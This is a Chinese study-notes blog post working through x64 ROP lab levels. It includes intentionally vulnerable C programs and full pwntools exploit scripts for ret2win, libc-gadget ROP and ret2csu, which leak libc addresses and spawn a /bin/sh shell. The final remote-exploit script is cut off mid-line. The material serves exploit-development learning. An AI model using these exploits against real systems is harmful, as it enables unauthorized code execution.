<p>linux_64与linux_86的区别主要有两点：<strong>首先是内存地址的范围由32位变成了64位</strong>。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。<strong>其次是函数参数的传递方式发生了改变</strong>，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
</blockquote>
<p>level3.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认打开系统的ASLR，然后用如下gcc命令编译，即不开启Canary：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level3.c -o level3</span><br></pre></td></tr></table></figure>
<p>查看基本功能和安全编译选项开关：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/20.png" alt=""></p>
<p>通过GDB的调试，用pattern创建大量字符串发送过去，程序终止在vulnerable_function()函数处：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/21.png" alt=""></p>
<blockquote>
<p>奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/22.png" alt=""></p>
<p>因此我们得到了136的偏移地址。</p>
<p>我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'print "A"*136+"ABCDEF\x00\x00"'</span> &gt; payload</span><br><span class="line">gdb level3</span><br><span class="line">(gdb) r &lt; payload</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/23.png" alt=""></p>
<p>可以看到我们已经成功的控制了PC的指针了。</p>
<p>知道了偏移量，且程序中本来就存在一个callsystem()函数，其会直接调用system(“/bin/sh”)，那就简单多了。</p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">callsystem_addr = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]callsystem() addr: "</span> + hex(callsystem_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(callsystem_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/24.png" alt=""></p>
<h3 id="level4——使用工具寻找gadgets"><a href="#level4——使用工具寻找gadgets" class="headerlink" title="level4——使用工具寻找gadgets"></a>level4——使用工具寻找gadgets</h3><blockquote>
<p>我们之前提到x86中参数都是保存在栈上，但在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于pop rdi; ret的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p>
<p><strong>ROPEME</strong>: <a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">https://github.com/packz/ropeme</a></p>
<p><strong>Ropper</strong>: <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></p>
<p><strong>ROPgadget</strong>: <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSa…</a></p>
<p><strong>rp++</strong>: <a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p>
<p>这些工具功能上都差不多，找一款自己能用的惯的即可。</p>
</blockquote>
<p>level4.c代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译，因为程序用到了dlopen()函数打开libc，因此需要-ldl参数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure>
<p>64位程序，动态链接文件，只开启了NX：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/25.png" alt=""></p>
<p>用IDA分析，看到程序在一开始运行时调用systemaddr()函数，该函数会从本程序用到的libc.so.6中获取其中的system()函数地址并打印出来：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/26.png" alt=""></p>
<p>和level3一样得到溢出偏移量为136。</p>
<p>下面开始使用工具来寻找合适的Gadgets。</p>
<p>因为我们知道了溢出偏移量和system()函数的地址，剩下的就是通过寄存器给system()函数传参了，而在64位中传参的前六个参数是通过寄存器来实现的，而且system()只接受一个参数，因此我们需要找到一条pop rdi;ret的Gadget来帮助我们实现，这里我们用的是ROPgadget工具帮我们查找：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/27.png" alt=""></p>
<p>当然，一般情况下自身的程序可能没有合适的Gadgets，这时我们可以到指定的libc.so文件中找到合适的：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/29.png" alt=""></p>
<p>编写payload，有两个Gadget可选，如果用的是libc中的Gadget则需要加上libc的实际地址来计算出该gadget的实际地址，因为libc.address = offset = system_addr - libc.symbols[‘system’] = gadget实际地址 - gadget在libc中地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">## self gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = 0x00000000004008b3</span></span><br><span class="line"><span class="comment">## libc gadget</span></span><br><span class="line">pop_rdi_ret_libc = <span class="number">0x0000000000021102</span></span><br><span class="line"></span><br><span class="line">system_addr = int(p.recv(<span class="number">1024</span>).split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]recv system() addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc.address = system_addr - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="comment">## libc gadget + libc addr</span></span><br><span class="line">pop_rdi_ret_addr = pop_rdi_ret_libc + libc.address</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh libc addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/28.png" alt=""></p>
<p>除了前面找的pop rdi;ret这个Gadget，我们还可以找另外一个gadget，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链，如下：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/30.png" alt=""></p>
<p>可以看到pop rax;pop rdi;call rax这个gadget，我们可以先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p>
<p>payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level4"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop|ret</span></span><br><span class="line"><span class="comment">## self gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = 0x00000000004008b3</span></span><br><span class="line"><span class="comment">## libc gadget</span></span><br><span class="line"><span class="comment">#pop_rdi_ret_libc = 0x0000000000021102</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop|call</span></span><br><span class="line">pop_call_libc = <span class="number">0x0000000000107419</span></span><br><span class="line"></span><br><span class="line">system_addr = int(p.recv(<span class="number">1024</span>).split()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]recv system() addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">libc.address = system_addr - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="comment">#pop_rdi_ret_addr = pop_rdi_ret_libc + libc.address</span></span><br><span class="line">pop_call_addr = pop_call_libc +libc.address</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh libc addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = "A" * 136 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">136</span> + p64(pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level5——通用gadgets"><a href="#level5——通用gadgets" class="headerlink" title="level5——通用gadgets"></a>level5——通用gadgets</h3><blockquote>
<p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p>
</blockquote>
<p>level5.c代码如下，相比于level3和level4，去掉了提供system()或其地址的辅助函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段，最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
</blockquote>
<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o level5 level5.c</span><br></pre></td></tr></table></figure>
<p>基本功能和安全编译开关和前面的一致。</p>
<p>溢出偏移量也和之前的一致，为136。</p>
<p>用objdump -d ./level5观察一下__libc_csu_init()这个函数：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/31.png" alt=""></p>
<p>可以看到，利用0x40061a处的代码可以控制rbx、rbp、r12、r13、r14和r15的值，<strong>随后利用0x400600处的代码可以将r13的值赋值给rdx、r14的值赋值给rsi、r15的值赋值给edi（这和蒸米原文的顺序是相反的，因为本地编译出来的程序所用的gadget有些许区别，其实这里利用的就是ret2csu技巧）</strong>，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
<p>这里列两种getshell的方法。</p>
<h4 id="Method1——只用ret2csu的Gadget"><a href="#Method1——只用ret2csu的Gadget" class="headerlink" title="Method1——只用ret2csu的Gadget"></a>Method1——只用ret2csu的Gadget</h4><p>第一种是蒸米讲解的方法，即利用该gadget构造3段payload，分别是泄露write()函数地址、向程序.bss段写入”/bin/sh”和system()或execve()函数地址、传入bss_addr+8处的参数并调用bss_addr地址处的函数即执行system(“/bin/sh”)。</p>
<p>最终exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment">#p = remote('192.168.17.155',10001)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(got_write)</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]read() got: "</span> + hex(got_read)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">	<span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">	<span class="comment"># rbx should be 0,</span></span><br><span class="line">	<span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">	<span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">	<span class="comment"># rdi=edi=r15d</span></span><br><span class="line">	<span class="comment"># rsi=r14</span></span><br><span class="line">	<span class="comment"># rdx=r13</span></span><br><span class="line">	payload = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">	payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	payload += p64(gadget2)</span><br><span class="line">	payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">	payload += p64(ret)</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 = csu(<span class="number">0</span>, <span class="number">1</span>, got_write, <span class="number">8</span>, got_write, <span class="number">1</span>, main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">execve_addr = libc.symbols[<span class="string">"execve"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]execve() addr: "</span> + hex(execve_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 = csu(<span class="number">0</span>, <span class="number">1</span>, got_read, <span class="number">16</span>, bss_addr, <span class="number">0</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(execve_addr))</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(rdi = bss_addr+8 = "/bin/sh", rsi=0, rdx=0)</span></span><br><span class="line">payload3 = csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, <span class="number">0</span>, <span class="number">0</span>, bss_addr + <span class="number">8</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload3#############\n"</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>简单说下：</p>
<ul>
<li>由于利用到泄露函数地址和向.bss段写内容的功能，需要先获取write()和read()函数的GOT地址；</li>
<li>本次利用的Gadget即ret2csu，定义一个csu函数，用于构造Gadget传参构造payload，其中payload构造是先填充溢出偏移量的字符、然后根据gadget1来设置对应寄存器的值、再调用gadget2、然后填充字符至gadget1的ret指令处、最后调用输入的返回地址即main处让程序继续执行下去；这里注意两个偏移量，第一个136是程序本身溢出到ret的偏移量，而第二个56则是gadget2跑完之后还要继续往下跑到gadget1的ret中去，这中间需要填充56个字节；</li>
<li>payload1利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止；</li>
<li>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着构造payload2，利用read()将system()或execve()的地址以及“/bin/sh”读入到.bss段内存中；</li>
<li>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</li>
</ul>
<p>在我的本地环境中，利用system()的exp会得不到shell，换了execve()才可以：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/32.png" alt=""></p>
<h4 id="Method2——利用两个Gadgets"><a href="#Method2——利用两个Gadgets" class="headerlink" title="Method2——利用两个Gadgets"></a>Method2——利用两个Gadgets</h4><p>其实不用向.bss段写内容再调用，有点繁琐，且同一个Gadget调用了3次。</p>
<p>除了利用ret2csu的gadget，这里还利用到pop rdi|ret这个gadget，主要用于给system(函数的第一个参数赋值并返回往下调用system()函数从而getshell：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/33.png" alt=""></p>
<p>基本利用过程就是：通过ret2csu的gadget泄露write()函数的真实地址，通过LibcSearcher或查询的方式得到libc的offset然后计算出system()函数和”/bin/sh”的真实地址，最后利用pop rdi|ret这个gadget构造exp执行system(“/bin/sh”)。</p>
<p>payload如下，下面将改为远程连接的形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level5')</span></span><br><span class="line">p = remote(<span class="string">'192.168.17.155'</span>,<span 